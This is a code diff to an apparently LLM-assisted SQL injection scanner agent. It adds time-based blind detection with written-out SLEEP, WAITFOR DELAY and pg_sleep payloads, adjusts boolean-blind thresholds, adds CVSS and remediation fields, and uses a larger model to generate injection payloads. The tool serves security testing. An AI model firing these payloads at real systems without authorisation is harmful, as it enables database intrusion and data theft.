@@ -32,6 +32,9 @@ const SQLI_SIGNATURES = [
   /java\.sql\.SQLException/i
 ];
 
+// FIX #4/#5: Configurable vector cap — no silent drops
+const MAX_VECTORS = 30;
+
 class SqliAgent {
   constructor() {
     this.name = 'SQLi Expert (NVIDIA Llama 70B)';
@@ -52,7 +55,13 @@ class SqliAgent {
     
     const findings = [];
     const ragContext = await RagMemory.getContextForAgent(this.type);
-    const targets = attackVectors.slice(0, 15);
+
+    // FIX #4/#5: Raise cap to MAX_VECTORS and warn if any are dropped
+    const skipped = attackVectors.length - MAX_VECTORS;
+    if (skipped > 0) {
+      console.warn(`[SQLi Agent] ⚠️ Attack surface capped at ${MAX_VECTORS} vectors — ${skipped} vectors skipped. Consider increasing MAX_VECTORS for full coverage.`);
+    }
+    const targets = attackVectors.slice(0, MAX_VECTORS);
 
     // Fire all vector analyses in parallel
     const vectorPromises = targets.map(vector => {
@@ -121,7 +130,6 @@ class SqliAgent {
       }
       // ===========================================
 
-
       const matchedSig = SQLI_SIGNATURES.find(sig => sig.test(body));
       if (matchedSig) {
         const errorSnippet = body.match(matchedSig)?.[0] || 'Database error';
@@ -136,11 +144,18 @@ class SqliAgent {
     // If the responses differ significantly, it's blind SQLi
     const blindResult = await this.testBlindSQLi(endpoint, parameter.name, sessionCookie);
     if (blindResult) {
-      this.log(`  ✅ SQLi CONFIRMED (boolean blind)! True/False responses differ by ${blindResult.diff} bytes`);
+      this.log(`  ✅ SQLi CONFIRMED (boolean blind)! True/False responses differ by ${blindResult.diff} bytes (${blindResult.relDiff}% relative)`);
       return blindResult.finding;
     }
 
-    // Step 3c: Login bypass detection for authentication forms
+    // Step 3c: Time-based blind SQLi detection (SLEEP payloads)
+    const timeResult = await this.testTimeBasedSQLi(endpoint, parameter.name, sessionCookie);
+    if (timeResult) {
+      this.log(`  ✅ SQLi CONFIRMED (time-based)! Server delayed ${timeResult.delay}ms with SLEEP payload`);
+      return timeResult.finding;
+    }
+
+    // Step 3d: Login bypass detection for authentication forms
     if (parameter.name === 'uid' || parameter.name === 'username' || parameter.name === 'email' || parameter.name === 'user') {
       const bypassResult = await this.testLoginBypass(endpoint, parameter.name, sessionCookie);
       if (bypassResult) {
@@ -173,21 +188,70 @@ class SqliAgent {
 
       this.log(`  [Blind SQLi] TRUE=${truLen}b FALSE=${falsLen}b BASE=${baseLen}b`);
 
-      // If true condition returns significantly more content than false → blind SQLi
       const diff = Math.abs(truLen - falsLen);
-      const significantDiff = diff > 100 && truLen > falsLen && truLen > baseLen;
+
+      // FIX: Lower threshold to 200 bytes (small PHP sites have small responses)
+      // Still require relative diff >25% and true>false>base ordering
+      const larger = Math.max(truLen, falsLen);
+      const relDiff = larger > 0 ? (diff / larger) * 100 : 0;
+      const significantDiff = (
+        diff > 200 &&
+        relDiff > 25 &&
+        truLen > falsLen &&
+        truLen > baseLen
+      );
 
       if (significantDiff) {
         return {
           diff,
+          relDiff: relDiff.toFixed(1),
           finding: this.buildFinding(
             endpoint.url, paramName, truePayload, 'Boolean-blind',
-            `TRUE condition response (${truLen}b) differs from FALSE condition (${falsLen}b) by ${diff} bytes`,
+            `TRUE condition response (${truLen}b) differs from FALSE condition (${falsLen}b) by ${diff} bytes (${relDiff.toFixed(1)}% relative difference). Baseline was ${baseLen}b.`,
             this.buildUrl(endpoint.url, paramName, truePayload)
           )
         };
+      } else {
+        this.log(`  [Blind SQLi] Diff of ${diff}b (${relDiff.toFixed(1)}%) below threshold — not significant enough, skipping`);
       }
     } catch (e) {}
+    return null;
+  }
+
+  async testTimeBasedSQLi(endpoint, paramName, sessionCookie = '') {
+    // Baseline timing check
+    const baseStart = Date.now();
+    const baseRes = await this.firePayload(endpoint, paramName, '1', sessionCookie);
+    const baseTime = Date.now() - baseStart;
+    if (!baseRes) return null;
+
+    // Time-based payloads for MySQL, MSSQL, PostgreSQL
+    const sleepPayloads = [
+      `1' AND SLEEP(5)-- -`,
+      `1; WAITFOR DELAY '0:0:5'--`,
+      `1' AND pg_sleep(5)--`,
+      `1 AND 1=(SELECT 1 FROM PG_SLEEP(5))--`
+    ];
+
+    for (const payload of sleepPayloads) {
+      try {
+        const start = Date.now();
+        const res = await this.firePayload(endpoint, paramName, payload, sessionCookie);
+        const elapsed = Date.now() - start;
+        // True positive only if: test delayed >= 4.5s AND baseline was fast (<2s)
+        if (res && elapsed >= 4500 && baseTime < 2000) {
+          this.log(`  ⏱ Time-based SQLi: Baseline=${baseTime}ms, Payload=${elapsed}ms with "${payload}"`);
+          return {
+            delay: elapsed,
+            finding: this.buildFinding(
+              endpoint.url, paramName, payload, 'Time-based Blind',
+              `Server responded in ${elapsed}ms (baseline: ${baseTime}ms) when SLEEP(5) injected. Confirms blind SQL injection.`,
+              this.buildUrl(endpoint.url, paramName, payload)
+            )
+          };
+        }
+      } catch (e) {}
+    }
     return null;
   }
 
@@ -232,15 +296,29 @@ class SqliAgent {
   }
 
   buildFinding(url, paramName, payload, technique, evidence, testUrl) {
+    const cvssMap = {
+      'Error-based': { score: 9.8, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H' },
+      'Error-based (WAF Bypassed)': { score: 9.8, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H' },
+      'Boolean-blind': { score: 9.1, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N' },
+      'Time-based Blind': { score: 8.6, vector: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:N' },
+      'Auth Bypass': { score: 9.5, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L' },
+    };
+    const cvss = cvssMap[technique] || { score: 9.8, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H' };
     return {
       finding: true,
       type: 'SQL Injection',
       endpoint: url,
       parameter: paramName,
       payload,
-      severity: 'Critical',
-      description: `SQL Injection confirmed via ${technique} technique. Payload "${payload}" triggered: "${evidence}". This allows attackers to extract, modify, or delete database contents.`,
+      technique,
+      severity: cvss.score >= 9.0 ? 'Critical' : 'High',
+      cvss: cvss.score,
+      cvssVector: cvss.vector,
+      cwe: 'CWE-89',
+      owasp: 'A03:2021 – Injection',
+      description: `SQL Injection confirmed via ${technique} technique on parameter "${paramName}". Payload: "${payload}". Evidence: ${evidence}. This allows attackers to read, modify, or delete all database contents.`,
       proof: evidence,
+      remediation: 'Use parameterized queries (prepared statements). Never concatenate user input into SQL strings. Deploy a WAF as temporary mitigation. Use least-privilege DB accounts.',
       testUrl
     };
   }
@@ -268,7 +346,7 @@ Return ONLY a valid JSON array of 6 payload strings. No explanation.
         method: 'POST',
         headers: { 'Authorization': `Bearer ${this.apiKey}`, 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          model: 'meta/llama-3.1-8b-instruct',
+          model: 'meta/llama-3.3-70b-instruct',
           messages: [{ role: 'user', content: prompt }],
           max_tokens: 200,
           temperature: 0.2,
@@ -300,7 +378,7 @@ Return ONLY a valid JSON array of 6 payload strings. No explanation.
     try {
       const testUrl = this.buildUrl(endpoint.url, paramName, payload);
       const controller = new AbortController();
-      const timeout = setTimeout(() => controller.abort(), 10000);
+      const timeout = setTimeout(() => controller.abort(), 20000);
 
       const opts = {
         signal: controller.signal,
